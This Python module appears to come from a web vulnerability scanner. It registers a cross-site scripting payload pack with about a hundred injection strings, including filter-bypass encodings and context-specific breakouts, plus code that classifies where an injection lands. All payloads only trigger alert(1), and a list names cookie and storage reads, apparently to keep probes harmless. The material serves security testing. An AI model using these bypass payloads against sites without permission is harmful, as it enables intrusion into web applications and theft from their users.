from .payloads import PayloadPack, register


EVENT_HANDLERS_SAFE = [
    "<script>alert(1)</script>",
    "<script>alert`1`</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror=alert(1)//>",
    "<img src=x onerror=alert(1) onerror=alert(2)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<iframe src=javascript:alert`1`></iframe>",
    "<a href=javascript:alert(1)>x</a>",
    "<a href=javascript:alert(1) autofocus onclick=alert(1)>x</a>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<marquee onstart=alert(1)>x</marquee>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<form><button formaction=javascript:alert(1)>x</button></form>",
    "<isindex action=javascript:alert(1) type=image>",
]

EVENT_HANDLERS_BYPASS = [
    "<ScRiPt>alert(1)</sCrIpT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=x onerror=alert(1) \x0b>",
    "<img src=x onerror=alert(1) \x0c>",
    "<img src=x onerror=alert(1) \x00>",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=alert\x28\x31\x29>",
    "<img src=x onerror=top\x5bal\x2b'ert'\x5d(1)>",
    "<img src=x onerror=top[`al`+`ert`](1)>",
    "<img src=x onerror=top[`\\u0061lert`](1)>",
    "<img src=x onerror=window['\\x61lert'](1)>",
    "<img src=x onerror=\\u0061lert(1)>",
    "<script>alert\\u00281\\u0029</script>",
    "<svg><script>alert(1)</script>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<svg><set attributeName=x to=y onbegin=alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
    "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">",
    "<base href=javascript:alert(1)//>",
    "<object data=\"data:text/html,<script>alert(1)</script>\">",
    "<embed src=\"data:text/html,<script>alert(1)</script>\">",
    "<script src=\"data:,alert(1)\"></script>",
    "javascript:alert(1)",
    "javascript:alert`1`",
    "javascript:alert(1)//",
    "java\x00script:alert(1)",
    "java\x09script:alert(1)",
    "java\x0ascript:alert(1)",
    "javas\x0dcript:alert(1)",
    "<img src=x:onerror=alert(1)>",
]

CONTEXT_VARIANTS = {
    "html_body": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<marquee onstart=alert(1)>",
    ],
    "attribute": [
        "x onmouseover=alert(1)",
        "x/onmouseover=alert(1)",
        "x\\ onmouseover=alert(1)",
        "x\t onmouseover=alert(1)",
        "x onfocus=alert(1) autofocus tabindex=0",
    ],
    "quoted_attr_double": [
        "\" onmouseover=\"alert(1)",
        "\" autofocus onfocus=\"alert(1)",
        "\"><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "\" onmouseover=alert(1) x=\"",
    ],
    "quoted_attr_single": [
        "' onmouseover='alert(1)",
        "' autofocus onfocus='alert(1)",
        "'><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "' onmouseover=alert(1) x='",
    ],
    "js_string": [
        "';alert(1);//",
        "\\';alert(1);//",
        "</script><script>alert(1)</script>",
        "\\u003c/script\\u003e\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "\\x3c/script\\x3e\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    ],
    "js_template": [
        "${alert(1)}",
        "`;alert(1);//",
        "${alert`1`}",
        "\\${alert(1)}",
        "`+alert(1)+`",
    ],
    "html_comment": [
        "--><img src=x onerror=alert(1)>",
        "--!><img src=x onerror=alert(1)>",
        " --><script>alert(1)</script>",
        "--!><svg onload=alert(1)>",
        "-->-<img src=x onerror=alert(1)>",
    ],
    "srcdoc": [
        "&lt;img src=x onerror=alert(1)&gt;",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "&lt;svg onload=alert(1)&gt;",
    ],
    "json_in_script": [
        "\\u003c/script\\u003e\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "</script><script>alert(1)</script>",
        "\\x3c/script\\x3e\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        "</script><img src=x onerror=alert(1)>",
        "\\u003cimg src=x onerror=alert(1)\\u003e",
    ],
}

EXPECTED_SIGNAL = {}
for _p in EVENT_HANDLERS_SAFE + EVENT_HANDLERS_BYPASS:
    EXPECTED_SIGNAL[_p] = {"kind": "exec", "verdict": "VULNERABLE"}
for _ctx, _ps in CONTEXT_VARIANTS.items():
    for _p in _ps:
        EXPECTED_SIGNAL[_p] = {"kind": "exec", "verdict": "VULNERABLE",
                                "context": _ctx}

MUST_NEVER = [
    "document.cookie",
    "localStorage.getItem",
    "sessionStorage.getItem",
]

PACK = PayloadPack(
    id="xss",
    family="xss",
    waf_safe=EVENT_HANDLERS_SAFE,
    waf_bypass=EVENT_HANDLERS_BYPASS,
    context_variants=CONTEXT_VARIANTS,
    decoder_chain=["html_entity", "url_single", "url_double", "js_escape"],
    must_never=MUST_NEVER,
    expected_signal=EXPECTED_SIGNAL,
)
register(PACK)


def classify_context(prefix, suffix="", quote_char=None):
    """Classify the injection context from surrounding HTML.

    prefix: HTML immediately BEFORE the reflection point
    suffix: HTML immediately AFTER the reflection point
    quote_char: '"' or "'" if inside a quoted attribute

    Returns one of:
      html_body, attribute, quoted_attr_double, quoted_attr_single,
      js_string, js_template, html_comment, srcdoc, json_in_script
    """
    pre = (prefix or "").lower()

    if _count(pre, "<!--") > _count(pre, "-->"):
        return "html_comment"

    if _count(pre, "<script") > _count(pre, "</script>"):
        if _in_srcdoc(pre):
            return "srcdoc"
        if _in_json_context(pre):
            return "json_in_script"
        if _in_template_literal(pre):
            return "js_template"
        return "js_string"

    if _in_srcdoc(pre):
        return "srcdoc"

    if quote_char is None:
        quote_char = _in_quoted_attr(pre)

    if quote_char == '"':
        return "quoted_attr_double"
    if quote_char == "'":
        return "quoted_attr_single"

    if _in_attr(pre):
        return "attribute"

    return "html_body"


def _count(s, sub):
    return s.count(sub)


def _in_srcdoc(pre):
    idx = pre.rfind("srcdoc")
    if idx < 0:
        return False
    window_start = max(0, idx - 200)
    return "<iframe" in pre[window_start:idx]


def _in_json_context(pre):
    idx = pre.rfind("<script")
    if idx < 0:
        return False
    tail = pre[idx:]
    return ("application/json" in tail) or ("application/ld+json" in tail)


def _in_template_literal(pre):
    idx = pre.rfind("<script")
    if idx < 0:
        return False
    tail = pre[idx:]
    n = 0
    i = 0
    while i < len(tail):
        c = tail[i]
        if c == "\\":
            i += 2
            continue
        if c == "`":
            n += 1
        i += 1
    return n % 2 == 1


def _in_attr(pre):
    last_lt = pre.rfind("<")
    last_gt = pre.rfind(">")
    return last_lt > last_gt


def _in_quoted_attr(pre):
    # If the prefix ends inside a tag attribute, return the open quote
    # char ('"' or "'"). Otherwise None. Handles backslash-escaped quotes
    # inside HTML-ish prefixes (srcdoc, data:, inline JSON string values).
    last_lt = pre.rfind("<")
    last_gt = pre.rfind(">")
    if last_lt < 0 or last_lt < last_gt:
        return None
    tag_content = pre[last_lt + 1:]
    dq = 0
    sq = 0
    i = 0
    while i < len(tag_content):
        c = tag_content[i]
        if c == "\\":
            i += 2
            continue
        if c == '"':
            dq += 1
        elif c == "'":
            sq += 1
        i += 1
    if dq % 2 == 1:
        return '"'
    if sq % 2 == 1:
        return "'"
    return None


def payloads_for_context(ctx, waf=None, budget=None):
    from .payloads import pick
    return pick(PACK, ctx=ctx, waf=waf, budget=budget)
